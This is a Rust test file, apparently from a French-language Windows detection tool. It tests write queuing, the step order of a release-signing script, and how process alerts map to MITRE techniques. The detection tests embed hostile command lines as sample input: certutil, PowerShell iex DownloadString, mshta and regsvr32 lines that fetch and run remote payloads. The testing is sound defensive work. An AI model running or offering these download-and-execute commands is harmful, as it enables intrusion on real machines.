    assert!(src.replace("\r\n", "\n").contains("fn ecrire_registre(h: &Historique) -> Result<(), String> {\n    commun::ecrire(FICHIER, h)"));
    assert!(e.contains("if g.is_none() {\n                    *g = Some((n, h));") || e.contains("if g.is_none() {\r\n                    *g = Some((n, h));"), "échec : copie remise en attente si aucune plus récente");
    assert!(e.contains("std::thread::sleep(std::time::Duration::from_secs(5));"), "nouvel essai 5 s plus tard");
}

#[test]
fn reponses_json_depot_garde_la_plus_recente() {
    // Prérelecture de #230, D1 : copies 5 et 6 déposées dans l'ordre inverse, la 6 reste en attente
    use crate::politique::deposer;
    let mut a: Option<(u64, &str)> = None;
    deposer(&mut a, (6, "six"));
    deposer(&mut a, (5, "cinq"));
    assert_eq!(a, Some((6, "six")), "une copie plus ancienne ne remplace jamais la plus récente en attente");
    deposer(&mut a, (6, "six bis"));
    assert_eq!(a, Some((6, "six")), "même numéro : gardée");
    deposer(&mut a, (7, "sept"));
    assert_eq!(a, Some((7, "sept")));
    let src = include_str!("politique.rs");
    assert!(src.contains("deposer(&mut EN_ATTENTE.lock().unwrap_or_else(|e| e.into_inner()), c);"), "ecrire_copie passe par deposer");
}

#[test]
fn reponses_json_commandes_attendent_leur_ecriture() {
    // Régression vue par la CI de #230 : une commande d'administrateur (ouvrir, clore, décision humaine) attend que sa
    // copie soit écrite ; le cycle (noter) et le fil des leurres (noter_suspension) n'attendent jamais
    let src = include_str!("politique.rs").replace("\r\n", "\n");
    for f in ["pub fn ouvrir(sorte: Sorte,", "pub fn clore(sortes: &[Sorte],", "pub fn decision_humaine(cible: &str, empreinte: Option<String>) {"] {
        let d = src.find(f).unwrap_or_else(|| panic!("{f}"));
        assert!(src[d..d + 200].contains("avec_attente(|e| {"), "{f} attend son écriture");
    }
    for f in ["pub fn noter(genre: Genre,", "pub fn noter_suspension(", "pub fn passer("] {
        let d = src.find(f).unwrap_or_else(|| panic!("{f}"));
        assert!(!src[d..d + 400].contains("avec_attente("), "{f} n'attend jamais le disque");
    }
    let ecr = &src[src.find("fn ecrivain()").unwrap()..];
    assert!(ecr.contains("*derniere = n;") && ecr.contains("ECRIT.notify_all();"), "le fil d'écriture signale chaque copie écrite");
    assert!(src.contains("attendre_ecriture(n, std::time::Duration::from_secs(10));"), "attente bornée");
}

#[test]
fn point2_commande_attend_sa_copie_hors_du_verrou_du_moniteur() {
    // Revue de l'auditeur du 2026-11-21, point 2 : une commande prend sa copie sous le verrou du moniteur, mais attend
    // l'écriture après l'avoir rendu. Mesure avec un disque ralenti (800 ms) : avant, le cycle attendait le disque
    // derrière la commande ; après, il prend le verrou aussitôt, et la commande attend toujours sa copie
    use crate::politique::{attendre_copies_commande, decision_humaine, regler_delai_ecriture_test};
    use std::sync::{Arc, Mutex};
    use std::time::{Duration, Instant};
    regler_delai_ecriture_test(800);
    let moniteur = Arc::new(Mutex::new(()));
    // Le « cycle » tente de prendre le verrou du moniteur 100 ms après le début de la commande
    let cycle = |m: Arc<Mutex<()>>| std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(100));
        let t = Instant::now();
        let _g = m.lock().unwrap();
        t.elapsed()
    });
    // Avant : l'attente se faisait sous le verrou (ancien avec_attente)
    let c = cycle(moniteur.clone());
    {
        let _g = moniteur.lock().unwrap();
        decision_humaine("point2-avant", None);
        attendre_copies_commande();
    }
    let avant = c.join().unwrap();
    // Après : copie prise sous le verrou, attente après (canal.rs)
    let c = cycle(moniteur.clone());
    let debut = Instant::now();
    {
        let _g = moniteur.lock().unwrap();
        decision_humaine("point2-apres", None);
    }
    attendre_copies_commande();
    let commande = debut.elapsed();
    let apres = c.join().unwrap();
    regler_delai_ecriture_test(0);
    eprintln!("point 2, disque ralenti à 800 ms : le cycle attend le verrou {avant:?} avant, {apres:?} après ; la commande répond en {commande:?}");
    assert!(avant >= Duration::from_millis(500), "avant : le cycle attendait le disque ({avant:?})");
    assert!(apres < Duration::from_millis(300), "après : le cycle n'attend plus le disque ({apres:?})");
    assert!(commande >= Duration::from_millis(700), "la commande attend toujours sa copie ({commande:?})");
    let canal = include_str!("canal.rs").replace("\r\n", "\n");
    assert!(canal.contains("let r = moniteur.lock().unwrap().executer(c, partage, prealable);\n"), "verrou rendu à la fin de l'instruction");
    assert!(canal.contains("crate::politique::attendre_copies_commande();\n                r\n"), "une seule attente, après le verrou");
    let p = include_str!("politique.rs").replace("\r\n", "\n");
    let a = &p[p.find("fn avec_attente<R>").unwrap()..];
    let a = &a[..a.find("\n}\n").unwrap()];
    assert!(!a.contains("attendre_ecriture("), "plus d'attente sous le verrou du moniteur");
}


#[test]
fn s230_05_attente_bornee_et_jamais_dans_le_cycle() {
    // Audit de #230, S230-05 : une commande cesse d'attendre dès que sa copie est écrite ou que l'écriture a échoué ; les
    // levées faites par le cycle n'attendent jamais ; le fil d'écriture ne tient pas ECRITURE pendant l'écriture disque
    use crate::politique::attente_finie as f;
    assert!(f(5, 5, 0) && f(5, 6, 0), "écrite ou dépassée");
    assert!(f(5, 3, 5) && f(5, 3, u64::MAX), "échec signalé ou fil d'écriture absent");
    assert!(!f(5, 4, 4), "ni écrite ni échouée : on attend");
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    assert!(m.contains("let r = self.debloquer(&t, &c, false);"), "levée du cycle sans attente");
    assert!(m.contains("let r = self.debloquer(t, cible, true);"), "levée par commande avec attente");
    assert!(m.contains("let clore = if commande { politique::clore } else { politique::clore_sans_attente };"));
    let p = include_str!("politique.rs").replace("\r\n", "\n");
    let e = p.find("fn ecrivain()").unwrap();
    let corps = &p[e..];
    assert!(corps.contains("let resultat = if deja { Ok(()) } else { ecrire_registre(&h) };"), "écriture disque hors du verrou ECRITURE");
    assert!(corps.contains("ECHOUEE.fetch_max(n, std::sync::atomic::Ordering::SeqCst);"), "échec signalé");
}

#[test]
fn s113_05_signataire_pris_dans_l_etat_de_la_verification() {
    // Tri de l'inventaire de la phase 6 (2026-11-21), S113-05 : la confirmation élevée ne relit plus le fichier par son
    // chemin après WinVerifyTrust (course par oplock, faux éditeur affiché) ; le sujet vient de l'état de la vérification
    let g = include_str!("../../src/Gui.cs");
    assert!(!g.contains("X509Certificate(chemin)"), "plus de relecture du fichier par son chemin");
    assert!(g.contains("Choix = 1, Fichier = p, Etat = 1 }"), "WTD_STATEACTION_VERIFY");
    assert!(g.contains("string sujet = SujetDeLEtat(donnees.Donnees);"));
    assert!(g.contains("donnees.Etat = 2;"), "état toujours fermé (WTD_STATEACTION_CLOSE)");
    assert!(g.contains("WTHelperGetProvSignerFromChain(donnees, 0, false, 0)") && g.contains("WTHelperGetProvCertFromChain(signataire, 0)"));
}

#[test]
fn signature_locale_script_unique_echec_ferme() {
    // Plan avant la première version signée, bloc 1.1 (décisions du mainteneur du 2026-11-21) : artefact « a-signer »
    // de la CI, empreinte comparée à celle de GitHub, MSI construit après la signature, manifeste d'après le MSI signé,
    // verifier-signatures.ps1, horodatage Certum puis DigiCert en repli, brouillon de version seulement
    let s = include_str!("../../signer-version.ps1").replace("\r\n", "\n");
    for verif in [
        r"if ($Tag -cnotmatch '^v\d+\.\d+(\.\d+)?$')",
        "if ($tete -ne $commitTag)",
        "if (git -C $racine status --porcelain)",
        "if (\"v$version\" -ne $Tag)",
        "n'est pas dans CLE_SIGNATURE",
        "$compiler.conclusion -ne 'success'",
        "$_.name -eq 'a-signer'",
        "if ($recue -ne $attendue)",
        "if ($s.Status -ne 'NotSigned')",
        "6AC824E1642D6F7277D0ED7EA09411A508F6116BA6FAE0AA5F2C7DAA2FF43D31",
        r"-Command '& $env:D4T_VERIFIER -Cles $env:D4T_CLES -Fichiers ($env:D4T_FICHIERS -split ''\|''); exit $LASTEXITCODE'",
        "if ($versionMsi -ne $attenduMsi)",
        "existe déjà sur GitHub",
    ] {
        assert!(s.contains(verif), "vérification absente : {verif}");
    }
    // Chaque vérification arrête le script ; un brouillon seulement, jamais une version publiée
    assert!(s.contains("function Arret([string]$t) { Write-Host \"ARRÊT : $t\" -ForegroundColor Red; exit 1 }"));
    assert!(s.contains("--draft --verify-tag") && !s.contains("gh release edit"), "brouillon, publié à la main");
    assert!(s.contains("foreach ($serveur in 'http://time.certum.pl/', 'http://timestamp.digicert.com')"), "Certum puis DigiCert");
    // Ordre : exécutables signés, puis MSI construit avec eux, puis MSI signé, puis manifeste, puis vérification
    let pos = |m: &str| s.find(m).unwrap_or_else(|| panic!("{m}"));
    assert!(pos("Signer @((Join-Path $bin 'deR4Tizer.exe')") < pos("construire-msi.ps1') -Version $version"));
    assert!(pos("construire-msi.ps1') -Version $version") < pos("Signer @((Join-Path $bin 'deR4Tizer.msi'))"));
    assert!(pos("Signer @((Join-Path $bin 'deR4Tizer.msi'))") < pos("Sha256 = (Sha256 (Join-Path $bin 'deR4Tizer.msi'))"));
    assert!(pos("Sha256 = (Sha256 (Join-Path $bin 'deR4Tizer.msi'))") < pos("-Command '& $env:D4T_VERIFIER"));
    assert!(pos("-Command '& $env:D4T_VERIFIER") < pos("gh release create $Tag"));
    // Prérelecture de #239 : verifier-signatures.ps1 jamais par -File (liste de fichiers coupée, D1) ; git par Natif
    // (exception de Windows PowerShell 5.1, D2) ; empreintes prises avant la vérification (S239-04) ; référence exacte
    // du tag (S239-05)
    assert!(!s.contains("-File (Join-Path $racine 'verifier-signatures.ps1')"));
    assert!(s.contains("Natif git -C $racine worktree add --detach $sources $commitTag"));
    assert!(pos("$empreintes = @{}") < pos("-Command '& $env:D4T_VERIFIER"));
    assert!(s.contains("repos/$Depot/git/ref/tags/$Tag"));
    // Audit de #239, S239-07 : CLE_SIGNATURE validée dès sa lecture ; aucune valeur insérée dans une ligne de commande
    assert!(s.contains(r"if ($cles -notmatch '^[0-9a-f]{64}(,[0-9a-f]{64})*$')"));
    assert!(pos(r"if ($cles -notmatch '^[0-9a-f]{64}") < pos("Signer @((Join-Path $bin 'deR4Tizer.exe')"));
    assert!(!s.contains("-Cles '$cles'") && !s.contains("-Command \"&"), "aucune ligne de commande construite avec des valeurs");
    // Audit de #239 : jeton seulement vers api.github.com (redirection suivie sans lui, S239-02) ; tag distant sur le
    // commit signé (S239-03) ; empreintes revérifiées avant l'envoi (S239-04) ; nettoyage (S239-01)
    assert!(s.contains("AllowAutoRedirect = $false") && s.contains("$sansJeton.GetByteArrayAsync($stockage)"));
    assert!(s.contains("if ($distant -ne $commitTag)"));
    assert!(pos("a changé depuis sa vérification") < pos("gh release create $Tag"));
    assert!(s.contains("Remove-Item -LiteralPath $Travail -Recurse -Force") && s.contains("worktree prune") && s.contains("$env:WIX = $wixAvant"));
    // Le nom du titulaire n'est jamais affiché ; le jeton de gh n'est jamais écrit
    for interdit in [".Subject", ".Issuer", "FriendlyName", "GetNameInfo", "Write-Host $jeton", "Write-Host \"$jeton"] {
        assert!(!s.contains(interdit), "{interdit}");
    }
    let wf = include_str!("../../.github/workflows/publication.yml");
    assert!(wf.contains("name: a-signer") && wf.contains("retention-days: 7"), "artefact à signer gardé 7 jours");
    // Revue de l'auditeur du 2026-11-22, point 3 : la valeur compilée est jointe à l'artefact, et la clé du certificat
    // lui est comparée (retrouvée dans le service) avant toute signature ; le test de comportement est
    // tests/test-cles-compilees.ps1, lancé par la CI
    assert!(wf.contains("bin/cles-compilees.txt") && wf.contains("\"$env:DER4TIZER_CLES_SIGNATURE\""));
    assert!(s.contains(". (Join-Path $racine 'cles-compilees.ps1')"));
    assert!(s.contains("'cles-compilees.txt,deR4Tizer.exe,deR4TizerSvc.exe'"));
    assert!(pos("if ($raisonCles) { Arret $raisonCles }") < pos("Signer @((Join-Path $bin 'deR4Tizer.exe')"));
    let cc = include_str!("../../cles-compilees.ps1");
    assert!(cc.contains("$texte.IndexOf($Brut") && cc.contains("-notmatch '[0-9A-Fa-f]'") && cc.contains("-notin $cles"));
    assert!(include_str!("../../.github/workflows/ci.yml").contains("./tests/test-cles-compilees.ps1"));
    assert!(!wf.contains("name: executables"));
    assert!(include_str!("../../docs/publication/signature-locale.md").contains("signer-version.ps1 -Tag vX.Y"));
}

#[test]
fn registre_reponses_echec_journalise_une_fois_et_publie() {
    // Revue de l'auditeur du 2026-11-21, point 1 : écriture de reponses.json en échec simulé, une ligne de journal au
    // premier échec et une au retour, rien entre les deux ; constat publié pendant l'échec, retiré au retour
    use crate::politique::{code_registre, Empechements, SuiviEcriture};
    let rien = Empechements::default();
    let mut s = SuiviEcriture::default();
    let premier = s.apres_essai(Some("accès refusé"), 1_000).expect("premier échec journalisé");
    assert!(premier.contains("reponses.json") && premier.contains("accès refusé"));
    assert!(s.apres_essai(Some("accès refusé"), 1_005).is_none(), "essai suivant en échec : rien au journal");
    assert!(s.apres_essai(Some("disque plein"), 1_010).is_none(), "autre raison, même série : rien au journal");
    assert_eq!(code_registre(&rien, s.echec_depuis), ("EcritureEnEchec", Some(1_000)), "constat levé pendant l'échec");
    let retour = s.apres_essai(None, 1_030).expect("retour journalisé");
    assert!(retour.contains("rétablie") && retour.contains("30 s"));
    assert!(s.apres_essai(None, 1_035).is_none(), "écriture normale : rien au journal");
    assert_eq!(code_registre(&rien, s.echec_depuis), ("", None), "constat retiré au retour");
    // Tous les cas où rien n'est écrit sont dits, jamais « écrit » (prérelecture de #236, D1) : lecture initiale refusée,
    // contenu mal formé, protection du dossier en échec, fil d'écriture absent
    let e = |f: fn(&mut Empechements)| { let mut x = Empechements::default(); f(&mut x); code_registre(&x, None).0 };
    assert_eq!(e(|x| x.lecture_refusee = true), "LectureRefusee");
    assert_eq!(e(|x| x.contenu_illisible = true), "ContenuIllisible");
    assert_eq!(e(|x| x.protection_en_echec = true), "ProtectionEnEchec");
    assert_eq!(e(|x| x.fil_absent = true), "EcritureEnEchec");
    // Copie dépassée : le suivi n'en tire rien (S236-01)
    assert!(include_str!("politique.rs").contains("let ligne = if deja { None } else {"));
    let i = include_str!("../../src/Incidents.cs");
    for code in ["\"LectureRefusee\"", "\"ContenuIllisible\"", "\"ProtectionEnEchec\"", "\"EcritureEnEchec\""] {
        assert!(i.contains(code), "page Santé : {code}");
    }
    let src = include_str!("politique.rs").replace("\r\n", "\n");
    let ecr = &src[src.find("fn ecrivain()").unwrap()..];
    assert!(ecr.contains(".apres_essai(") && ecr.contains("commun::journal(&m)"), "le fil d'écriture passe par le suivi");
    let m = include_str!("moniteur.rs");
    assert!(m.contains("politique::etat_registre()"), "état publié dans etat.json");
    let i = include_str!("../../src/Incidents.cs");
    assert!(i.contains("e.RegistreReponses") && i.contains("perdues au redémarrage"), "ligne de la page Santé");
}

/// Prérelecture de #255, D1 : deux chaînes aux mêmes processus mais aux signaux différents ont deux empreintes ; les
/// mêmes signaux, une seule ; le code ne contient jamais de technique
#[test]
fn audit_p2_chaine_code_des_signaux() {
    use crate::apprentissage::signature_avec;
    use crate::natif::InfoListe;
    let alerte_chaine = |code: &str, raison: &str| {
        let mut arbre = crate::chaines::Arbre::default();
        let liste: std::collections::HashMap<u32, InfoListe> = [(100, ("explorer", 4)), (200, ("powershell", 100)), (300, ("cmd", 200))]
            .into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
        arbre.maj(&liste);
        arbre.signaler_code(200, 6, raison, &["T1059.001".to_string()], code);
        arbre.signaler_code(300, 6, "second signal", &[], "PRC-005");
        let mut a = arbre.alertes(&arbre.chaines());
        assert_eq!(a.len(), 1, "une chaîne");
        a.remove(0)
    };
    let a = alerte_chaine("PRC-002", "PowerShell obscurci");
    let b = alerte_chaine("PRC-003#PRC-003:certutil", "outil détourné");
    assert_eq!(a.regle, "CHA-001");
    assert!(!a.comportement.is_empty() && !a.comportement.contains("T1"), "code : {}", a.comportement);
    assert_eq!(a.comportement, "PRC-002+PRC-005");
    assert_ne!(signature_avec(&a, "e"), signature_avec(&b, "e"), "signaux différents, une seule empreinte");
    assert_eq!(signature_avec(&a, "e"), signature_avec(&alerte_chaine("PRC-002", "PowerShell obscurci"), "e"));
    // Code long ou non ASCII : empreinte courte, stable
    use crate::chaines::code_chaine;
    let long: Vec<(&str, &str)> = (0..20).map(|_| ("", "réseau : connexion très suspecte vers une adresse")).collect();
    let c = code_chaine(&long);
    assert!(c.starts_with("sha:") && c.len() == 20 && c == code_chaine(&long), "{c}");
    assert_eq!(code_chaine(&[("B", ""), ("A", ""), ("B", "")]), "A+B");
}

/// Audit de #255, S255-01 : deux règles ASR sur le même programme et le même fichier ont deux empreintes
#[test]
fn audit_p2_def007_regles_asr_distinctes() {
    use crate::apprentissage::signature_avec;
    let xml = |guid: &str| format!(r#"<Event><System><EventID>1121</EventID></System><EventData><Data Name='ID'>{guid}</Data><Data Name='Path'>C:\Users\Public\a.dll</Data><Data Name='Process Name'>C:\Users\Public\x.exe</Data></EventData></Event>"#);
    let a = crate::defender::traduire(&xml("D4F940AB-401B-4EFC-AADC-AD5F3C50688A")).expect("1121");
    let b = crate::defender::traduire(&xml("56A863A9-875E-4185-98A7-B882C64B5CE5")).expect("1121");
    assert_eq!(a.regle, "DEF-007");
    assert_eq!(a.comportement, "asr:d4f940ab-401b-4efc-aadc-ad5f3c50688a");
    assert_ne!(signature_avec(&a, "e"), signature_avec(&b, "e"));
}

// ------------------------------------------------- revue de l'auditeur du 2026-11-22, point 1 : techniques observées

fn info_processus_test(image: &str, ligne: &str) -> crate::processus::InfoProcessus {
    crate::processus::InfoProcessus::pour_test(image, Some(ligne), None)
}

/// PRC-003 sur certutil : la technique de certutil (T1105), jamais T1047 ni les autres outils de la règle
#[test]
fn audit_p1_prc003_certutil_sans_t1047() {
    let p = info_processus_test(r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe");
    let mut a = crate::processus::alerte_processus(1234, &p).expect("PRC-003");
    assert_eq!(a.regle, "PRC-003");
    crate::mitre::enrichir(&mut a);
    assert_eq!(crate::mitre::identifiants(&a), ["T1105"], "certutil : T1105 seulement ({})", a.mitre);
    assert!(!a.mitre.contains("T1047") && !a.mitre.contains("T1197") && !a.mitre.contains("T1218"));
    // L'outil vient du motif qui a correspondu, pas d'un nom vu ailleurs dans la ligne
    let w = info_processus_test(r"C:\Windows\System32\wbem\wmic.exe", r"wmic process call create C:\certutil\x.exe");
    let mut b = crate::processus::alerte_processus(1, &w).expect("PRC-003 wmic");
    crate::mitre::enrichir(&mut b);
    assert_eq!(crate::mitre::identifiants(&b), ["T1047"]);
    for (ligne, t) in [("bitsadmin /transfer j http://x/y c:\\y", "T1197"), ("mshta http://x/y.hta", "T1218"),
                       ("regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll", "T1218"), ("rundll32 javascript:\"\\..\\mshtml\"", "T1218")] {
        assert_eq!(crate::processus::technique_prc003(ligne), t, "{ligne}");
    }
    // Prérelecture de #258, réserve 1 : deux outils vus, les deux techniques
    let deux = info_processus_test(r"C:\Windows\System32\cmd.exe", r"cmd /c certutil -urlcache -f http://x/a.exe a.exe & wmic process call create a.exe");
    let mut c = crate::processus::alerte_processus(2, &deux).expect("PRC-003");
    crate::mitre::enrichir(&mut c);
    assert_eq!(crate::mitre::identifiants(&c), ["T1105", "T1047"]);
}

/// Revue externe du 2026-11-22, point mineur : PRC-002 sur un téléchargement seul ne porte plus T1027 Code obscurci ;
/// l'obscurcissement la porte, une ligne qui a les deux porte les deux ; le code de comportement nomme les motifs vus
#[test]
fn revue_prc002_obscurci_seulement_si_vu() {
    use crate::processus::{alerte_processus, codes_prc002, technique_prc002};
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let tele = "powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')";
    let mut a = alerte_processus(1, &info_processus_test(ps, tele)).expect("PRC-002");
    assert_eq!(a.regle, "PRC-002");
    assert_eq!(a.comportement, "PRC-002:telecharge");
    crate::mitre::enrichir(&mut a);
    assert_eq!(crate::mitre::identifiants(&a), ["T1059.001"], "téléchargement seul ({})", a.mitre);
    assert!(!a.mitre.contains("T1027"));
    let enc = format!("powershell -NoProfile -EncodedCommand {}", "A".repeat(48));
    let mut b = alerte_processus(2, &info_processus_test(ps, &enc)).expect("PRC-002 encodé");
    assert_eq!(b.comportement, "PRC-002:obscurci");
    crate::mitre::enrichir(&mut b);
    assert_eq!(crate::mitre::identifiants(&b), ["T1059.001", "T1027"]);
    let deux = "powershell iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://x/a'))))";
    assert_eq!(technique_prc002(deux), "T1059.001 / T1027");
    assert_eq!(codes_prc002(deux), ["obscurci", "telecharge"]);
    for (ligne, t) in [("pwsh -c [Convert]::FromBase64String($x)", "T1059.001 / T1027"), ("powershell -c (New-Object Net.WebClient).DownloadFile('http://x/a','a')", "T1059.001"),
                       ("powershell -w hidden -c iex $s", "T1059.001"), ("powershell -c Invoke-Expression $s", "T1059.001")] {
        assert_eq!(technique_prc002(ligne), t, "{ligne}");
    }
    // Le motif de la règle reste la réunion des motifs : mêmes lignes vues qu'avant le découpage
    for ligne in [tele, enc.as_str(), deux, "powershell -File a.ps1", "powershell -enc YQ==", "cmd /c downloadstring", "pwsh -windowstyle hidden -c start http://x"] {
        let regle = crate::processus::suspicions_regles(ligne).iter().any(|(_, id)| *id == "PRC-002");
        assert_eq!(regle, !codes_prc002(ligne).is_empty(), "{ligne}");
    }
    assert!(matches!(crate::regles::techniques("PRC-002"), Some(crate::regles::Techniques::ParLAlerte)));
}

/// PER-001 sur une clé Run : T1547.001, jamais T1546.003 ni les autres types de la règle
#[test]
fn audit_p1_per001_cle_run_sans_t1546() {
    let e = crate::commun::EntreeDemarrage {
        cle: "Run (machine)|x".into(), categorie: "Run (machine)".into(), nom: "x".into(),
        commande: r"C:\Users\Public\x.exe".into(), cible: r"C:\Users\Public\x.exe".into(), ..Default::default()
    };
    let mut a = crate::persistance::alerter(&e, "NOUVEAU");
    assert_eq!(a.regle, "PER-001");
    crate::mitre::enrichir(&mut a);
    assert_eq!(crate::mitre::identifiants(&a), ["T1547.001"], "clé Run ({})", a.mitre);
    assert!(!a.mitre.contains("T1546") && !a.mitre.contains("T1543") && !a.mitre.contains("T1053"));
    // PER-002 sur la même clé : T1547.001 seulement (plus T1112)
    let mut m = crate::persistance::alerter(&e, "MODIFIÉ");
    assert_eq!(m.regle, "PER-002");
    crate::mitre::enrichir(&mut m);
    assert_eq!(crate::mitre::identifiants(&m), ["T1547.001"]);
    use crate::persistance::technique_entree;
    for (t, id) in [("tache", "T1053.005"), ("service", "T1543.003"), ("pilote", "T1543.003"), ("wmi", "T1546.003"),
                    ("dossier-demarrage", "T1547.001"), ("winlogon", ""), ("ifeo", ""), ("appinit", ""), ("autre", "")] {
        assert_eq!(technique_entree(t), id, "{t}");
    }
}

/// RES-002, RES-003 et DNS-001 : la technique observée seulement
#[test]
fn audit_p1_reseau_technique_observee() {
    for (regle, attendu) in [("RES-002", "T1071.001"), ("RES-003", "T1071.001"), ("DNS-001", "T1071.004")] {
        assert_eq!(crate::mitre::identifiants_de_regle(regle, ""), [attendu], "{regle}");
    }
}
